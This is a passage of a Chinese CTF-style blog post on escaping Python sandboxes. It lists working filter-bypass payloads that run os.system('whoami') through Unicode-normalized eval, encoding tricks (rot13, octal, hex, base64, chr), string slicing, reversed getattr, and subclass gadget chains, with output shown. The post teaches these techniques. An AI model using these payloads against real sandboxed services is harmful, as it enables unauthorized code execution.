+<li>要是过滤了eval、exec，可以这样利用python3解释的特性（python3 支持了 Unicode 变量名且解释器在做代码解析的时候，会对变量名进行规范化）<blockquote>
+<blockquote>
+<blockquote>
+<p>ᵉval(‘<strong>import</strong>(“os”).system(“whoami”)’)    #python3<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<ol start="5">
+<li>编码</li>
+</ol>
+<p>#decode利用</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p><strong>import</strong>(“bf”.decode(‘rot_13’)).system(“jubnzv”.decode(‘rot_13’))    #python2<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>#byte</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>print(bytes(range(32,127)))<br>b’ !”#$%&amp;&#39;()*+,-.&#x2F;0123456789:;&lt;&#x3D;&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_&#96;abcdefghijklmnopqrstuvwxyz{|}~’<br><strong>import</strong>(“os”).system(bytes([119, 104, 111, 97, 109, 105]))<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>#chr</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p><strong>import</strong>(chr(111)+chr(115)).system(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105))<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>#oct</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>exec(“\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\17<br>1\163\164\145\155\50\47\167\150\157\141\155\151\47\51”)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>#hex</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>eval(“\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x<br>73\x79\x73\x74\x65\x6d\x28\x27\x77\x68\x6f\x61\x6d\x69\x27\x29”)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>#base64</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>exec(<strong>import</strong>(‘base64’).b64decode(‘X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ3dob2FtaScp’))<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>##only python2</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>exec(‘X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ3dob2FtaScp’.decode(“base64”))<br>ydj<br>6. 字符截取<br>先找一个返回结果包含我们所需字母的，这里我们选择().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()<br>().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()<br>[&lt;class ‘type’&gt;, &lt;class ‘async_generator’&gt;, &lt;class ‘bytearray_iterator’&gt;, &lt;class ‘bytearray’&gt;, &lt;class ‘bytes_iterator’&gt;, &lt;class ‘bytes’&gt;, &lt;class ‘builtin_function_or_method’&gt;, &lt;class ‘callable_iterator’&gt;, &lt;class ‘PyCapsule’&gt;, &lt;class ‘cell’&gt;, &lt;class ‘classmethod_descriptor’&gt;, &lt;class ‘classmethod’&gt;, &lt;class ‘code’&gt;, &lt;class ‘complex’&gt;, &lt;class ‘_contextvars.Token’&gt;, &lt;class ‘_contextvars.ContextVar’&gt;, &lt;class ‘_contextvars.Context’&gt;, &lt;class ‘coroutine’&gt;, ……]<br>然后利用str()+[]截取字符，如下<br>str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[38]<br>‘o’<br>str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[5]<br>‘s’<br>有时候要找的字母太靠后，还要一个一个数，不够优雅，这时候我们可以利用ord()+chr()来字符自增，比如获取了s的位置，就可以利用ascii码来计算其他的<br>chr(ord(str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[5])+6)<br>‘y’<br>最终payload<br><strong>import</strong>(str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[38]+str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[5]).system(chr(ord(str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[5])+4)+chr(ord(str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[38])-7)+str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[38]+chr(ord(str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[38])-14)+chr(ord(str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[38])-2)+chr(ord(str(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())[38])-6))<br>ydj<br>7. dict取键<br>list(dict(whoami&#x3D;1))[0]<br>‘whoami’<br>str(dict(whoami&#x3D;1))[2:8]<br>‘whoami’</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<p><strong>import</strong>(“os”).system(str(dict(whoami&#x3D;1))[2:8])<br>ydj<br>8. getattr<br>用于返回对象属性值<br>getattr(getattr(<strong>builtins</strong>, ‘<strong>tropmi</strong>‘[::-1])(‘so’[::-1]), ‘metsys’[::-1])(‘whoami’)<br>ydj</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>getattr(<strong>import</strong>(‘types’).<strong>builtins</strong><a href="'so'%5B::-1%5D">‘<strong>tropmi</strong>‘[::-1]</a>, ‘mets’ ‘ys’[::-1])(‘whoami’)    #结合types库<br>ydj<br>9. pop+<strong>getitem</strong><br>pop：用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值<br>__getitem__：返回所给键对应的值。当对象是序列时，键是整数。当对象是映射时（字典），键是任意值<br>两者结合可用于[]给过滤的情况<br>‘’.<strong>class</strong>.<strong>mro</strong>.<strong>getitem</strong>(2)<br>&lt;type ‘object’&gt;</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>‘’.<strong>class</strong>.<strong>mro</strong>.<strong>getitem</strong>(2).<strong>subclasses</strong>().pop(59).<strong>init</strong>.func_globals.get(‘linecache’).os.popen(‘whoami’).read()    #python2<br>‘ydj\n’<br>10. f-string特性<br>python&gt;&#x3D;3.6<br>f’{<strong>import</strong>(“os”).system(“whoami”)}’<br>ydj<br>11. <strong>call</strong><br>一般情况下类方法的调用是通过先创建类对象再通过a.b()的方式来调用，但是如果类中只有一个方法或者一个方法的使用频率非常高，那么就可以为这个方法命名为__call__来简化调用<br>“”.<strong>class</strong>.<strong>mro</strong>[-1].<strong>subclasses</strong>()[29].<strong>call</strong>(eval, ‘<strong>import</strong>(“os”).system(“whoami”)’)<br>ydj<br>12. 数字获取<br>ord(‘b’)-ord(‘a’)    #以此类推<br>1</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>len([])<br>0<br>len([[],[]])    #以此类推<br>2</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>还有很多思路，就不一一列举<br>0x04总结<br>沙箱逃逸是一个有很多细节的考点，各种函数的结合利用，各类python不同的版本的特性，除了我总结的这些外，还有更多高级玩法，师傅们也可以多去看看大佬们的文章（看大佬的文章总是能有所收获）</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" rel="tag"># Python沙箱逃逸</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/11/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/" rel="prev" title="PHP反序列化之字符逃逸">
+      <i class="fa fa-chevron-left"></i> PHP反序列化之字符逃逸
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/" rel="next" title="LaTex注入">
+      LaTex注入 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="YDJ"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">YDJ</p>
+  <div class="site-description" itemprop="description">我这一生，如履薄冰</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">发布</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">YDJ</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">22k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:12</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
